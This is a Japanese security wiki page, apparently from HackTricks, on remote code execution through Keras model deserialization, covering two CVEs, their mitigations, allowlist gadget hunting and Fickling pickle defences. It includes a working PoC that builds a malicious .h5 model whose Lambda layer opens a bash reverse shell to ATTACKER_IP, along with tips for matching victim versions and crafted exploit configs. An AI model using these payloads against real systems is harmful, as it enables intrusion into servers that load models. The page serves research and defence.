# KerasモデルのデシリアライズRCEとGadget Hunting

{{#include ../../banners/hacktricks-training.md}}

このページでは、Kerasのモデルデシリアライズパイプラインに対する実践的なexploit手法をまとめ、ネイティブの.keras形式の内部構造とattack surfaceを解説し、Model File Vulnerabilities（MFV）や修正後のgadgetを見つけるためのresearcher向けツールキットを紹介します。

## .kerasモデル形式の内部構造

.kerasファイルは、少なくとも以下を含むZIPアーカイブです:<sup>[[1]](#references)</sup>
- metadata.json – 一般情報（例: Kerasのバージョン）
- config.json – モデルアーキテクチャ（主なattack surface）
- model.weights.h5 – HDF5形式のweights

config.jsonを基に再帰的なデシリアライズが行われます。Kerasはモジュールをimportし、クラスや関数を解決して、攻撃者が制御する辞書からレイヤーやオブジェクトを再構築します。<sup>[[1]](#references)</sup>

Denseレイヤーオブジェクトのコード例:

```json
{
  "module": "keras.layers",
  "class_name": "Dense",
  "config": {
    "units": 64,
    "activation": {
      "module": "keras.activations",
      "class_name": "relu"
    },
    "kernel_initializer": {
      "module": "keras.initializers",
      "class_name": "GlorotUniform"
    }
  }
}
```

デシリアライズでは、以下が実行されます。<sup>[[1]](#references)</sup>
- module/class_nameキーからのモジュールのインポートとシンボル解決
- 攻撃者が制御するkwargsを使ったfrom_config(...)またはコンストラクターの呼び出し
- ネストされたオブジェクト（activations、initializers、constraintsなど）の再帰的な処理

歴史的に、config.jsonを細工する攻撃者には、次の3つのプリミティブが提供されていました。<sup>[[1]](#references)</sup>
- インポートされるモジュールの制御
- 解決されるクラスや関数の制御
- コンストラクター/from_configに渡されるkwargsの制御

## CVE-2024-3660 – Lambda-layer bytecode RCE

根本原因:
- Legacy Lambdaのデシリアライズでは、攻撃者が制御するmarshaled codeからPython関数を再構築していました。`func_load()`はペイロードをbase64デコードし、`marshal.loads()`を呼び出して`FunctionType`を作成します。生成された関数のbytecodeはLambdaの呼び出し時に実行されます。また、影響を受ける2.13より前のloaderでは、legacy形式に対するsafe-modeチェックが適用されていませんでした。<sup>[[3]](#references)[[16]](#references)[[17]](#references)[[18]](#references)</sup>

native Keras v3 archiveでは、Lambda関数は`__lambda__`オブジェクトとして表現され、その`code`フィールドにはbase64エンコードされたmarshaled codeが格納されます。<sup>[[17]](#references)[[18]](#references)</sup>

```json
{
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "exploit_lambda",
    "function": {
      "class_name": "__lambda__",
      "config": {
        "code": "<base64(marshal.dumps(function.__code__))>",
        "defaults": null,
        "closure": null
      }
    }
  }
}
```

緩和策:
- Keras は、ネイティブの Keras v3 形式ではデフォルトで `safe_mode=True` を適用します。`Lambda` 内のシリアライズされた Python lambda は、ユーザーが明示的に `safe_mode=False` を指定しない限りブロックされます。この保護は、レガシー形式には同じようには適用されません。<sup>[[1]](#references)[[16]](#references)[[17]](#references)</sup>

注:
- レガシー形式（古い HDF5 保存データ）や古いコードベースでは、最新のチェックが適用されない場合があります。そのため、被害者が古いローダーを使用している場合、「downgrade」型の攻撃が依然として有効なことがあります。

## CVE-2025-1550 – Keras 3.0.0～3.8.x における任意のモジュールインポート

根本原因:
- `_retrieve_class_or_fn` は、`config.json` 内の攻撃者が制御するモジュール文字列に対して `importlib.import_module(module)` を使用していました。
- 影響: 細工された `.keras` アーカイブにより、`safe_mode=True` であっても、`Model.load_model()` に攻撃者が指定した Python モジュールや関数をインポートさせ、インポート時の副作用を発生させたり、攻撃者が制御する引数を渡したりできました。<sup>[[1]](#references)[[4]](#references)</sup>

Exploit のアイデア:

```json
{
  "module": "maliciouspkg",
  "class_name": "Danger",
  "config": {"arg": "val"}
}
```

Security improvements (Keras ≥ 3.9):<sup>[[1]](#references)[[2]](#references)</sup>
- Module allowlist: import対象を公式エコシステムのモジュールに制限: keras, keras_hub, keras_cv, keras_nlp
- Safe mode default: safe_mode=True により、安全でない Lambda のシリアライズ済み関数の読み込みをブロック
- Basic type checking: デシリアライズされたオブジェクトが期待される型と一致する必要がある

## 実践的なexploit: TensorFlow-Keras HDF5 (.h5) Lambda RCE

レガシーなTensorFlow-Kerasのデプロイ環境では、HDF5モデルファイル (`.h5`) が引き続き受け入れられる場合があります。攻撃者が、サーバーが後で読み込む、または推論に使用するモデルをアップロードできる場合、影響を受けるローダーは、攻撃者が制御するPythonコードを含むLambda layerをデシリアライズする可能性があります。このコードは、アプリケーションのモデル処理フロー内で実行される可能性があります。<sup>[[3]](#references)[[7]](#references)[[16]](#references)</sup>

ターゲットがモデルを呼び出したときにLambdaがreverse shellを実行する、悪意のある.h5を作成する最小限のPoC:

```python
import tensorflow as tf

def exploit(x):
    import os
    os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
    return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```

注意点と信頼性に関するヒント:
- トリガーポイントはフォーマットやワークフローによって異なります。参照先の記事では、prediction 中に payload が2回実行されることが確認されています。副作用は繰り返し発生するものとして扱い、payload は冪等にしてください。<sup>[[7]](#references)</sup>
- バージョン固定: シリアライズの不一致を避けるため、被害者の TF/Keras/Python のバージョンに合わせてください。たとえば、ターゲットが Python 3.8 と TensorFlow 2.13.1 を使用している場合は、その環境で成果物を作成します。<sup>[[7]](#references)</sup>
- 環境を手早く再現する方法:

```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```

- 検証: `os.system("ping -c 1 YOUR_IP")` のような無害な payload は、reverse shell に切り替える前に実行を確認するのに役立ちます（例: tcpdump で ICMP を観測する）。<sup>[[7]](#references)</sup>

## 修正後の allowlist 内の gadget surface

Keras の module allowlist と safe mode を有効にしていても、許可された callable が副作用を引き起こす場合があります。たとえば、`keras.utils.get_file` は URL からダウンロードし、設定された cache の場所に書き込むため、gadget analysis の候補になります。<sup>[[1]](#references)[[19]](#references)</sup>

候補となる Lambda の設定（制御されたテストで呼び出しシグネチャを検証してください）:

```json
{
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "dl",
    "function": {
      "module": "keras.utils",
      "class_name": "get_file",
      "config": null,
      "registered_name": null
    },
    "arguments": {
      "origin": "https://example.com/artifact.bin",
      "cache_dir": "/tmp/keras-cache"
    }
  }
}
```

重要な制限:
- `Lambda.call()` は常にモデル入力を最初の位置引数として渡し、設定された `arguments` をキーワード引数として渡します。`get_file` の場合、その位置引数は `fname` に入ります。tensor/path の型が一致しないと、ダウンロード前にこの候補は失敗する可能性があるため、確実に動作する gadget ではありません。<sup>[[1]](#references)[[16]](#references)[[19]](#references)</sup>

## AI/ML モデル向け ML pickle の import allowlisting (Fickling)

多くの AI/ML モデル形式（PyTorch の `.pt`/`.pth`/`.ckpt`、joblib/scikit-learn の artifact、その他の Python ネイティブ形式）には、Python の pickle データが埋め込まれています。上記のレガシー Keras Lambda の経路では、代わりに marshal 形式の関数 bytecode が使われるため、これは別のデシリアライゼーションリスクです。pickle opcode はデシリアライゼーション中に攻撃者が制御する動作を実行する可能性があり、モデルの改ざんや RCE につながります。また、単純な scanner では新規または未登録の危険な import を見逃すことがあります。<sup>[[7]](#references)[[8]](#references)[[14]](#references)[[18]](#references)</sup>

実用的な fail-closed 防御策は、Python の pickle deserializer をフックし、unpickle 中にレビュー済みの無害な ML 関連 import のみを許可することです。Trail of Bits の Fickling はこのポリシーを実装しており、数千件の公開 Hugging Face pickle を基に構築された、厳選済みの ML import allowlist を備えています。<sup>[[8]](#references)[[13]](#references)</sup>

「安全な」import のセキュリティモデル（研究と実践から導き出した考え方）では、pickle が使用する import 対象のシンボルは、以下の条件をすべて満たす必要があります。<sup>[[8]](#references)</sup>
- コードを実行したり、実行を引き起こしたりしない（コンパイル済み/ソースコードのオブジェクト、shell の実行、hook などを含まない）
- 任意の属性や item を取得・設定できない
- pickle VM から他の Python オブジェクトを import したり、参照を取得したりできない
- 間接的なものも含め、二次デシリアライザー（例: marshal、ネストされた pickle）を起動しない

プロセスの起動時にできるだけ早く Fickling の保護を有効にし、framework による pickle の読み込み（torch.load、joblib.load など）をすべて検査します。<sup>[[9]](#references)</sup>

```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```

運用上のヒント:
- 必要に応じて、hooksを一時的に無効化／再有効化できます:<sup>[[9]](#references)</sup>

```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```

- 既知の正常なモデルがブロックされる場合は、シンボルを確認したうえで、環境の allowlist を拡張してください:<sup>[[9]](#references)</sup>

```python
fickling.hook.activate_safe_ml_environment(also_allow=[
    "package.subpackage.safe_symbol",
    "another.safe.import",
])
```

- Fickling は、より細かな制御が必要な場合に使える汎用ランタイムガードも提供しています:<sup>[[9]](#references)</sup>
  - fickling.always_check_safety() ですべての pickle.load() に対するチェックを強制
  - with fickling.check_safety(): でスコープを限定して強制
  - fickling.load(path) / fickling.is_likely_safe(path) で単発のチェック

- 可能であれば、pickle 以外のモデル形式（例: SafeTensors）を優先してください。<sup>[[15]](#references)</sup> pickle を受け入れる必要がある場合は、最小権限でネットワークへの送信を無効にしてローダーを実行し、allowlist を適用してください。

この allowlist 優先の戦略は、互換性を高く保ちながら、一般的な ML pickle の exploit 経路を確実に阻止します。ToB のベンチマークでは、Fickling は合成された悪意のあるファイルを 100% 検出し、主要な Hugging Face リポジトリにあるクリーンなファイルの約 99% を許可しました。<sup>[[8]](#references)[[10]](#references)</sup>


## Researcher toolkit

1) 許可されたモジュール内での体系的な gadget 発見

keras、keras_nlp、keras_cv、keras_hub に含まれる候補の callable を列挙し、ファイル、ネットワーク、プロセス、環境変数に副作用を及ぼすものを優先します。<sup>[[1]](#references)</sup>

<details>
<summary>allowlist に登録された Keras モジュール内の危険な可能性がある callable を列挙する</summary>

```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
    if not hasattr(mod, "__path__"):
        return
    for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
        yield m.name

candidates = []
for root in ALLOWLIST:
    try:
        r = importlib.import_module(root)
    except Exception:
        continue
    for name in iter_modules(r):
        if name in seen:
            continue
        seen.add(name)
        try:
            m = importlib.import_module(name)
        except Exception:
            continue
        for n, obj in inspect.getmembers(m):
            if inspect.isfunction(obj) or inspect.isclass(obj):
                sig = None
                try:
                    sig = str(inspect.signature(obj))
                except Exception:
                    pass
                doc = (inspect.getdoc(obj) or "").lower()
                text = f"{name}.{n} {sig} :: {doc}"
                # Heuristics: look for I/O or network-ish hints
                if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
                    candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```

</details>

2) 直接的なdeserializationテスト（.kerasアーカイブ不要）

細工したdictをKeras deserializerに直接渡し、受け入れられるパラメータを調べ、副作用を観察します。<sup>[[1]](#references)</sup>

```python
import keras

cfg = {
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "probe",
    "function": {
      "module": "keras.utils",
      "class_name": "get_file",
      "config": null,
      "registered_name": null
    },
    "arguments": {
      "origin": "https://example.com/x",
      "cache_dir": "/tmp/keras-cache"
    }
  }
}

layer = keras.saving.deserialize_keras_object(cfg, safe_mode=True)  # Observe behavior
```

3) バージョンと形式をまたいだ検証

Kerasは、ガードレールや形式の異なる複数のコードベース／世代に存在します:<sup>[[1]](#references)</sup>
- TensorFlow built-in Keras: tensorflow/python/keras (legacy、削除予定)
- tf-keras: 別途メンテナンス
- Multi-backend Keras 3 (official): ネイティブの .keras を導入

コードベースと形式（.keras と legacy HDF5）をまたいでテストを繰り返し、回帰やガードの欠落を明らかにします。

## References

- [1] [Kerasモデルのデシリアライズにおける脆弱性の調査 (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [2] [Keras PR #20751 – serializationにチェックを追加](https://github.com/keras-team/keras/pull/20751)
- [3] [CVE-2024-3660 – Keras LambdaのデシリアライズによるRCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [4] [CVE-2025-1550 – Kerasの任意モジュールimport (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [5] [huntrレポート – 任意import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [6] [huntrレポート – 任意import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [7] [HTB Artificial – TensorFlow .h5 Lambda RCEからrootへ](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [8] [Trail of Bits blog – Ficklingの新しいAI/ML pickleファイルスキャナー](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [9] [Fickling – AI/ML環境の保護 (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [10] [Fickling pickleスキャン用ベンチマークコーパス](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [11] [Picklescan](https://github.com/mmaitre314/picklescan)
- [12] [ModelScan](https://github.com/protectai/modelscan)
- [13] [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [14] [Sleepy Pickle攻撃の背景](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [15] [SafeTensorsプロジェクト](https://github.com/safetensors/safetensors)
- [16] [CERT/CC VU#253266 – Keras 2 Lambda Layersによる任意コードインジェクション](https://kb.cert.org/vuls/id/253266)
- [17] [Keras Lambda layerのソース (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/layers/core/lambda_layer.py)
- [18] [Keras Python utilitiesのソース (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/utils/python_utils.py)
- [19] [Keras `get_file` API](https://keras.io/api/utils/python_utils/#get_file-function)
{{#include ../../banners/hacktricks-training.md}}
